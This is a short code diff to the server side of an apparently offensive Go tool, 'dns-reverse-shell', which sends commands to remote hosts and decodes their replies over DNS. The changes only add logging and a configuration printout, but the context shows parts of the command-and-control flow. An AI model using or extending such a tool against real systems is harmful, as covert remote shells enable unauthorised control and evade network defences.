@@ -3,6 +3,7 @@ package server
 import (
 	"dns-reverse-shell/main/protocol"
 	"dns-reverse-shell/main/protocol/encoder"
+	"dns-reverse-shell/main/utils"
 	"fmt"
 	"github.com/miekg/dns"
 )
@@ -33,7 +34,7 @@ func NewDnsServer(port string) *DNSServer {
 
 func (s *DNSServer) Initialize() {
 	server := s.createServer()
-	fmt.Println("Starting server on port '" + s.port + "'")
+	s.printConfig()
 	go s.commandHandler.(*serverCommandHandler).init()
 	err := server.ListenAndServe()
 	if err != nil {
@@ -76,6 +77,7 @@ func (s *DNSServer) poll(w dns.ResponseWriter, r *dns.Msg) func() {
 func (s *DNSServer) answer(w dns.ResponseWriter, r *dns.Msg) func(command string) {
 	return func(command string) {
 		if command == "ok" {
+			fmt.Println(utils.CurrentTimeAsLogFormat() + "answer received:")
 			fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
 		}
 		s.sendAnswer(w, r, command)
@@ -98,4 +100,12 @@ func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
 		fmt.Println(err)
 		return
 	}
+}
+
+func (s *DNSServer) printConfig() {
+	fmt.Println("----------------------------------------")
+	fmt.Println("CONFIGURATION:")
+	fmt.Println("Server side timeout is set to " + (timeout * timeoutIterations).String())
+	fmt.Println("Starting server on port '" + s.port + "'")
+	fmt.Println("----------------------------------------")
 }
